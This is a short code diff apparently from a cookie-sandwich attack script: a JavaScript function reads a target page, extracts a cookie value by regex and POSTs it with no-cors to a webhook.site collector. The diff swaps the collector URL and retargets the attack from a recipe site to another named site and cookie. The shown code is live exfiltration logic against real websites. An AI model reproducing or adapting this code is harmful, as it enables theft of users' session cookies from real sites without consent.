@@ -26,7 +26,7 @@ async function sandwich(target, cookie) {
         var result = responseData.match(regexf);
         const resultado = result.join(" ")
         // Step 4: Alert respone
-        const x2 = await fetch("https://webhook.site/0536458d-220b-4da3-9c4d-0d5f79160bc5/", {
+        const x2 = await fetch("https://webhook.site/6a262b3f-8053-4c6c-b7b8-50c0a5f15f50/", {
             method: "POST",
             mode: 'no-cors',
             headers: {
@@ -41,4 +41,4 @@ async function sandwich(target, cookie) {
     }
 }
 
-setTimeout(sandwich, 100, 'https://www.allrecipes.com/instant-pot-quinoa-recipe-7494907', 'globalTI_SID');
+setTimeout(sandwich, 100, 'https://www.xnxx.gold/', 'stafc');
